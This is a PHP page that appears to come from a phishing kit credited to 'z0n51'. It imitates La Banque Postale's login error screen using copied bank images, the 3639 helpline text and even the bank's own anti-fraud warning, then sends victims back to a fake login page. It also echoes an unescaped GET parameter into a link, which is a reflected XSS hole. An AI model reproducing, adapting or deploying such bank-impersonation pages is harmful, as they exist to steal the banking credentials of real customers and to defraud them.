<?php

/**
 * @link              https://www.z0n51.com/
 * @since             13/05/2020
 * @package           LA BANQUE POSTALE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      LA BANQUE POSTALE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.png" type="image/png"> 

        <title>Bienvenue</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header">
            <div class="top-header">
                <div class="container">
                    <div class="left">
                        <img style="min-width: 582px;" class="d-lg-inline-block d-md-none d-sm-none d-none" src="../assets/images/top-header-left.png">
                        <img class="d-lg-none d-md-block d-sm-inline-block d-inline-block" src="../assets/images/top-header-left2.png">
                    </div>
                    <div class="right text-right d-lg-inline-block d-md-none d-sm-none d-none"><img style="min-width: 165px;" src="../assets/images/top-header-right.png"></div>
                </div>
            </div>
            <div class="mainmenu">
                <div class="container">
                    <div class="left">
                        <img class="d-lg-inline-block d-md-none d-sm-none d-none" style="min-width: 481px;" src="../assets/images/header-left.png">
                        <img class="d-lg-none d-md-inline-block d-sm-inline-block d-inline-block" src="../assets/images/logo.png">
                    </div>
                    <div class="right text-right">
                        <img class="d-lg-inline-block d-md-none d-sm-none d-none"  style="min-width: 383px;" src="../assets/images/header-right.png">
                        <img class="d-lg-none d-md-inline-block d-sm-none d-none"  style="min-width: 503px;" src="../assets/images/header-right2.png">
                        <img class="d-lg-none d-md-none d-sm-inline-block d-inline-block"  style="min-width: 228px;" src="../assets/images/header-right3.png">
                    </div>
                </div>
            </div>
            <div class="login-area">
                <div class="container">

                    <div class="row justify-content-center">
                        <div class="col-10">
                            <div class="row">
                                <div class="col-md-5">
                                    <div class="login-box" style="background-color: #17479E;">
                                        <div class="error">
                                            <p>Votre identifiant (10 chiffres) ou votre mot de passe n'a pas été reconnu. Si vous rencontrez des difficultés pour vous connecter, veuillez contacter un de nos téléconseillers au 3639* choix 4.</p>
                                            <p>* 0,15 €/min + prix d'un appel. Pour accéder aux services du 3639 depuis l'étranger, composez le +33 1 45 45 36 39 à partir d'un poste fixe (coût de communication internationale pour la France).</p>
                                            <a href="login.php?error=<?php echo $_GET['error']; ?>" class="return"><i class="fas fa-caret-right"></i> Retour</a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-7">
                                    <div class="login-content">
                                        <ul class="mb50">
                                            <li>> Aide à la connexion</li>
                                            <li>> Identifiant / Mot de passe oublié</li>
                                            <li>> Sécurité Identifiant / Mot de passe</li>
                                            <li>> Accessibilité</li>
                                        </ul>
                                        <p class="mb50 font-weight-bold">Covid-19 : La Banque Postale fait évoluer son dispositif. En savoir plus</p>
                                        <p class="fz13 mb50">De faux e-mails, sms et des appels téléphoniques vous demandant vos coordonnées personnelles et informations bancaires (identifiants, codes d’accès à vos comptes en ligne ou codes reçus par SMS, ...) peuvent vous être adressés par des personnes mal intentionnées au nom de La Banque Postale. Il peut s'agir d'une tentative de fraude. Veillez à ne jamais y répondre, ne pas cliquer sur les liens, ni ouvrir les pièces jointes. Transférez le à alertespam@labanquepostale.fr ou contacter votre conseiller habituel. Consultez les messages d’information et de sensibilisation de La Banque Postale sur le site www.labanquepostale.fr page « Alerte et mise en garde. ».</p>
                                        <p class="mb-0">
                                            Pour toute anomalie, contactez rapidement le 3639*.<br>
                                            * service 0,15 €/min  + prix d'un appels
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>  
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main"></main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <img src="../assets/images/footer.png">
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>